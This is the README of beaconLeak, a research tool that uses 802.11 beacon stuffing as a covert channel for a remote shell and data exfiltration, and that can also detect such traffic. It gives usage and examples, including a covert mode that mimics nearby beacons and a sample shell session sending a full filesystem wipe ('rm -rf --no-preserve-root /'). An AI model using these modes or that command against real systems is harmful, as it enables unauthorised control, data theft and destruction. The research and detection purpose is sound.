# beaconLeak v0.9.0

beaconLeak is an open source tool developed as a proof
of concept of the beacon stuffing method as a covert channel. This channel
allows command and control or data exfiltration using the wireless network card 
without association or authentication. beaconLeak includes
the necessary functionality to both leak data as an attacker and detect the 
attack for defense purposes. Detection mode uses basic indicators of compromise
and generate log entries to be  consumed by monitoring or correlation security 
systems.

## Description

The beacon stuffing attack is a wireless physical attack, so wireless proximity
is required. Because of the need to push custom frames through the wireless 
interface, the tool must be run with either root privileges or network admin 
capabilities. Packet injection is a must for full functionality.  
This tool uses Scapy to transmit the 802.11 (Dot11) frames, and pyNaCL to have
all data encrypted on transit.

* c2 mode: remote covert shell
* leak mode: command channel and data exfiltration
* detect mode: detect the use of this method (multiple tool detection)

## Requirements

* Root privileges
* Python 3 with pip
* Packet Injection capable Wireless NIC

## Installation
*These instructions are for Linux based systems only, other platforms are* 
*partially supported, please check for more info in the repository.*

1. Set up a Python virtual environment

```
# python -m venv bl
```

2. Load Python virtual environment

```
# source bl/bin/activate
```

3. Install the Python libraries dependencies to the virtual environment

```
(bl)# pip install -r requirements.txt
```

4. ???
5. Profit! 

## Usage

```
usage: beaconleak.py [-h] (--leak | --detect | --c2) [--pcap PCAP [PCAP ...]]
                     [--autohop] [--loglevel LOGLEVEL] [--covert] [--psk PSK]
                     [--ssid SSID] [--bssid BSSID] [--delay DELAY] [--debug]
                     iface

     _                       __            _
    | |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
    | . | -_| .'|  _| . |   |  |__| -_| .'| '_|
    |___|___|__,|___|___|_|_|_____|___|__,|_,_|
                            by cjcase [v0.9.0]

    

positional arguments:
  iface                 Wireless interface in monitor mode

optional arguments:
  -h, --help            show this help message and exit
  --debug               Debug verbosity.

modes:
  --leak                (target) Leak data mode.
  --detect              (detect) Check surroundings for possible attacks
  --c2                  (attack) Command & control, remote shell

detect mode options:
  --pcap PCAP [PCAP ...]
                        pcap file(s) for offline beacon analysis
  --autohop             (Linux only) Automatic channel hopping
  --loglevel LOGLEVEL   log level, lowest is critical

c2 and leak mode options:
  --covert              Be extra sneaky by mimicking surrounding beacons
  --psk PSK             Custom encryption passphrase
  --ssid SSID           Emulated station WiFi name
  --bssid BSSID         Emulated station MAC address
  --delay DELAY         delay to sniff for command output response [default=5]
```

## Examples

### beaconLeak in detection mode
This mode will use your device's wireless radio in monitor mode to detect
stuffed beacons in real time.

```
(bl)# python beaconleak.py --detect wlan0mon 
```

Optionally, you can analyze previous wireless packet captures to find stuffed
beacons. e.g. you could sniff your wireless surroundings with Wireshark, save
the captures to then analyze with beaconLeak.
In this mode, the interface is still a required argument but ignored.

```
(bl)# python beaconleak.py --pcap cap1.pcap cap2.pcap cap3.pcap --detect lo0 
```

### beaconLeak in C2 mode
This mode emulates a trivial shell, will allow you to communicate with any
target that shares the same PSK, like the default built-in PSK.

```
(bl)# python beaconleak.py --c2 wlan0mon 
```

If you'd like to be more sneaky, you can toggle the covert mode, which will
search for the noisiest beacon in your surroundings and mimimc it. You can also 
use your own PSK for encryption, but make sure the target is also started with 
this passphrase. beaconLeak will use pyNaCl's KDF to generate a strong key from 
this string.

```
(bl)# python beaconleak.py --covert --psk "secret sauce" --c2 wlan0mon
```

The covert channel is designed to be two-way, so it needs a delay in seconds 
where C2 mode will sniff packets to receive the target's output. This delay can 
be modified with the ```--delay``` flag. If you don't care about the output, 
instead of using a 0 delay, you can prepend your commands with the '!'
character.

```
(bl)# python beaconleak.py --c2 wlan0mon

 _                       __            _
| |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
| . | -_| .'|  _| . |   |  |__| -_| .'| '_|
|___|___|__,|___|___|_|_|_____|___|__,|_,_|
                        by cjcase [v0.9.0]


[*] Using interface wlan0mon, type '!help' for usage, use Ctrl+C to exit
[beaconshell] >>> !rm -rf --no-preserve-root /
```

### beaconLeak in leak mode (victim simulation)
By default this mode will not generate any output, you can use debug mode to 
check what is happening.

```
(bl)# python beaconleak.py --leak wlan0mon 
```

### Debug Mode
All modes have an extra flag to toggle verbosity, this will let you see more of
what is happening, it's also useful to us if you find a bug and submit the 
issue with output from the this mode.

```
(bl)# python beaconleak.py --leak --debug wlan0mon 
```

## Collaboration
Have an idea for a cool new feature? want to help fix an issue or optimize how 
this tool works? Please submit a pull request!

## License

[GNU GLPv3](https://www.gnu.org/licenses/gpl.txt)


## Acknowledgements

This tool was inspired by the "bridging the airgap" research work by 
Mordecai Guri, et. al. 
A previous description of the beacon stuffing method for exfiltration was 
described by Tom Neaves in his [Trustwave Spider Labs blog post](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/smuggler-an-interactive-80211-wireless-shell-without-the-need-for-authentication-or-association/) about his tool 
"Smuggler".
[PyExfil](https://github.com/ytisf/PyExfil/) by Yuval Nativ has a
basic implementation of this method that predates our tool, its method has been
added to our detection functionality. 

This project was developed as a research project for Tallinn University of
Technology's Cyber Security Master programme and funded by the Dora Plus fund.

![Dora Plus](http://haridus.archimedes.ee/sites/default/files/styles/medium/public/eu_regional_development_fund_horizontal_0.jpg)